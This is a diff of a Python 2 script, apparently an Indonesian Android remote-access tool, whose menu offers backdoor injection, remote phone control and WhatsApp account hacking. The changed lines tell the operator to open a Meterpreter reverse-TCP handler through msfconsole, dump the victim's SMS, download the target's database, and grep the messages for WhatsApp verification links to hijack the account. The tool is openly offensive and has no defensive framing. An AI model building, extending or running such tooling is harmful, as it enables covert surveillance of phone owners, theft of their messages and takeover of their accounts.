@@ -3,7 +3,6 @@
 import os, sys
 import time
 import random
-from termcolor import colored
 
 putih="\x1b[1;97m"
 merah="\x1b[1;91m"
@@ -134,16 +133,21 @@ def extract_wa():
 	nxt()
 	print hijau
 	flush(merah+'[!]'+hijau+' Anda akan memasuki mode meterpreter')
-	flush(merah+'[!]'+hijau+' pastikan Backdoor dan OpenVPN telah aktif')
+	flush(merah+'[!]'+hijau+' pastikan Backdoor') 
+	flush('    dan OpenVPN telah aktif')
+	flush(merah+'[!]'+hijau+' Ambil Kode Verifikasi Target')
+	flush('    Dan database target')
+	flush(merah+'[!]'+hijau+' Gunakan Command')
 	print cyan
-	flush('   ###dump_sms###')
+	flush('    dump_sms	')
+	flush('    download {database}')
 	nxt()
 	flush(hijau+'Membuka Msfconsole ... ')
-	time.sleep(3)
 	remote()
 	logo()
 	flush(putih+'Buka link Verifikasi')
 	flush('Untuk Meretas akun Target')
+	flush('Jika link tidak Muncul, ulangi dump_sms')
 	print putih+'---------------------------------------------------'
 	print cyan
 	os.system('cat *txt | grep -o [a-z.]*/[0-9][0-9][0-9][0-9][0-9][0-9] > link.txt')
@@ -160,7 +164,6 @@ def extract_wa():
 		g.close
 		os.system('cat y.txt')
 	f.close
-	flush('Jika link tidak Muncul, ulangi dump_sms')
 	back()
 
 def awal():
@@ -176,21 +179,20 @@ def pilmal():
 		if zedd == '1':
 			spyphone()
 		else:
-			print '\x1b[1;91m[!] Pilih 1'
+			print '\x1b[1;91m[!] pilihan salah'
 			os.system('clear')
 			awal()
-        
+    
 def malware():
     os.system('clear')
     logo()
     os.system('figlet Malware |lolcat')
     print '\x1b[1;91m1.\x1b[1;97mSpyphone'
-    #print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
     print '\r\x1b[1;91m__________________________________________«Back» '
 
 def logo():      
 	f = open('Baner/asci')
-	print colored(f.read(),'yellow')
+	print merah+f.read()
 	f.close
 	print '---------------------------------------------------'
 	print cyan+' Author  : '+green+'Gafar Risky {PyRAT-svg}   '
@@ -200,7 +202,7 @@ def logo():
 	print ''
 
 def remote():
-    os.system("clear") 	
+    os.system("clear")    	
     logo()
     os.system('rm -rf ip.txt')
     os.system('ifconfig > ip.txt')
@@ -231,7 +233,7 @@ def remote():
       remote()
     else :
       os.system("clear")
-      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit;sessions -k 1-10'");
+      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
       raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
       os.system('clear')
 
@@ -278,13 +280,13 @@ def menu():
     os.system('clear')
     time.sleep(1)
     logo()
-    print '\x1b[1;91m1.\x1b[1;97mInject Bacdoor '
+    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor '
     print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
-    print '\x1b[1;91m3.\x1b[1;97mRemote Android '
-    print '\x1b[1;91m4.\x1b[1;97mHack Akun Wa'
+    print '\x1b[1;91m3.\x1b[1;97mRemote Android'
+    print '\x1b[1;91m4.\x1b[1;97mHack akun Whatsapp'+cyan+' *New'
     print '\x1b[1;91m5.\x1b[1;97mUpdate--'
     print '\x1b[1;91m6.\x1b[1;97mExit'
-    print '\r\x1b[1;91m______________________________« Pilih MENU » '
+    print '\r\x1b[1;91m__________________________________________«» '
 
 def pilih():
     zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
@@ -302,19 +304,21 @@ def pilih():
             else:
               if zedd == '3':
                 remote()
+                home()
               else:
 				  if zedd == '4':
 					extract_wa()
-				  else:
+				  else:	
 					 if zedd == '5':
-						update()
+					   update()
 					 else:
-						if zedd == '6':
-							out()
-						else:
-							print '\x1b[1;91m[!] Pilih 1-6'
-							os.system('clear')
-							home()
+					   print 'ok'
+					   if zedd == '6':
+					     exit()
+					   else:
+					     print '\x1b[1;91m[!] Pilih 1-6'
+					     os.system('clear')
+					     home()
 
 def home():
 	menu()
